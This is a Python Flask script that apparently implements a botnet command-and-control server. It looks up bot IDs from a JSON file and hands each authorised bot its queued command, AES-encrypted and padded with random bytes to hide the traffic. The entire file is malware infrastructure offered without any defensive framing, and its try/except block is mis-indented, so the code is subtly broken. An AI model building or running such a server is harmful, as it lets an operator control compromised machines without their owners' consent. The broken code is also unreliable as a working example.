from flask import Flask
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto import Random
import os
import json

with open('botnetIDs.json', 'r') as botnetIDs:
    botnetIDs_data = json.loads(botnetIDs.read())


app = Flask(__name__)

@app.route('/')
# ‘/’ URL is bound with index() function.
def index():
    return ''

pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aes_enc(data, key):
    data = pad(data)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return base64.b64encode(os.urandom(16) + iv + os.urandom(16) + cipher.encrypt(data.encode()))

@app.route('/<location>/<botnetID>')
def location(location, botnetID):

    botnetID = botnetID.split("=")[1]
    if botnetID in botnetIDs_data:
        try:
            if location in botnetIDs_data[botnetID]['access']:
                if base64.b64decode(botnetIDs_data[botnetID]['command']) == b'':
                    return ''
                else:
                    return aes_enc(base64.b64decode(botnetIDs_data[botnetID]['command']).decode(), base64.b64decode(botnetIDs_data[botnetID]['key']))
            except:
                return ''
    else:
        return ''
  

if __name__ == '__main__':
    app.run(host='192.168.157.131', port=1111)